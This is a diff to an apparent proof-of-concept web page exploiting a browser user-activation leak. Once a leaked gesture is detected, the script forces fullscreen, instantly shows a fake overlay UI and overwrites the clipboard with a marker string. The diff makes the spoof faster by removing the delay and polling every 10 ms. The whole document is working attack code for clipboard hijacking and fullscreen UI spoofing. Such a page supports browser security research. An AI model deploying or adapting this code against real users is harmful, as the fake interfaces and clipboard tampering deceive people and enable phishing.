@@ -83,43 +83,26 @@
     const statusBox = document.getElementById('status-box');
     const fakeOverlay = document.getElementById('fake-overlay');
 
-    // Start checking for activation leak
     const checkLeak = setInterval(async () => {
         const isActive = navigator.userActivation.isActive;
 
         if (isActive) {
-            clearInterval(checkLeak); // Stop checking once caught
+            clearInterval(checkLeak); 
 
-            // 1. UI Update
-            statusText.innerText = "VULNERABLE (ACTIVATION LEAKED!)";
-            statusBox.className = "leaked";
-            console.log("[!] Activation leaked! Executing payloads...");
-
-            // 2. Payload: Clipboard Hijacking
-            try {
-                await navigator.clipboard.writeText("HACKED_BY_GHOST_GESTURE_2026");
-                console.log("[-] Clipboard hijacked successfully.");
-            } catch (err) {
-                console.error("Clipboard failed: ", err);
-            }
-
-            // 3. Payload: Fullscreen Trigger
             try {
                 await document.documentElement.requestFullscreen();
-                console.log("[-] Fullscreen entered.");
-
-                // 4. Timing Trick: Wait for "Press Esc" native message to disappear (approx 3s)
-                setTimeout(() => {
-                    document.getElementById('main-ui').style.display = 'none';
-                    fakeOverlay.style.display = 'flex';
-                    console.log("[-] Native notification cleared. Showing Fake UI.");
-                }, 3500);
+                fakeOverlay.style.display = 'flex';
+                document.getElementById('main-ui').style.display = 'none';
+                console.log("[-] Fullscreen & Overlay Active Instantly.");
+                await navigator.clipboard.writeText("HACKED_BY_GHOST_GESTURE_2026");
+                statusText.innerText = "VULNERABLE (LEAKED!)";
+                statusBox.className = "leaked";
 
             } catch (err) {
-                console.error("Fullscreen failed: ", err);
+                console.error("Exploit failed: ", err);
             }
         }
-    }, 50);
+    }, 10);
 </script>
 
 </body>
